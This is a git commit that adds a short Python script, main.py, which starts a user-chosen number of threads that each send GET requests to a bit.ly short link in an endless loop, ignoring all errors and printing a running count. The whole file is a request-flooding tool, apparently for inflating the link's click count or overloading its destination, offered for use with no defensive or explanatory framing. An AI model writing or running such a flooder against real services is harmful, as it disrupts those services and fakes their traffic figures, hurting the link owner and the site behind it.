c4bf7d6e6deee2eb5b14baaff2f0e341cf7ccbb6
Haris123346 <93548238+Haris123346@users.noreply.github.com>
2023-01-10 17:57:29 +0300

    f

---
+++ main.py
@@ -0,0 +1,30 @@
+import httpx
+import threading
+from colorama import Fore, Style
+
+g = Fore.GREEN
+r = Style.RESET_ALL
+b = Style.BRIGHT
+sent = f"[{Fore.BLUE}{b}>{r}]"
+counter = 0
+
+
+def sendRequest():
+    global counter
+    client = httpx.Client()
+    while True:
+        try:
+            client.get("https://bit.ly/enquete64")
+            counter += 1
+            print(f"{sent}{g}{b} Request: {counter} sent...{r}")
+        except:
+            continue
+
+
+if __name__ == "__main__":
+    threadCount = int(input(f"{sent}{g}{b} Enter your thread count: {r}"))
+    threads = [
+        threading.Thread(target=sendRequest) for _ in range(threadCount)
+    ]
+    for thread in threads:
+        thread.start()
